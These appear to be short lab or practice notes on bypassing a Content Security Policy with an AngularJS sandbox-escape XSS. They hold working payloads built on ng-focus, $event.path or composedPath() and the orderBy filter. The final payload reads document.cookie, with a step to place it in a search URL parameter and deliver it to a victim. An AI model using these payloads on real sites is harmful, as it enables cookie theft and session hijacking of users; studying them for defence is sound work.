to trick CSP
use ng-focus

<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">

the path property is specific to Chrome and contains an array of elements that triggered the event

orderBy:'[].constructor.from([1],alert): trigger

our payload: <input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)'>

add to url search= and deliver to victim
